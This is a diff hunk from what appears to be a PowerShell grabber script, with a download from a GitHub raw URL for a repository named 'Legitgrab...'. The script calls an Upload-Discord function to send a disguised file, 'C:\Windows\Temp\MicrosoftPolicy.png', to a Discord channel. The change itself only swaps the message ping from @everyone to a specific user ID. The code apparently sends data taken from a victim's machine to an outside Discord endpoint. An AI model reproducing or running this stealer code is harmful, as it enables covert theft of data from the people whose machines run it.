@@ -120,7 +120,7 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Appolon24800/Legitgrab
 ######################################################################
 
 ######################################################################
-Upload-Discord -text "||@everyone||"
+Upload-Discord -text "||<@767438758902759494>||"
 Start-Sleep -Seconds 3
 Upload-Discord -text "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
 Upload-Discord -file "C:\Windows\Temp\MicrosoftPolicy.png"
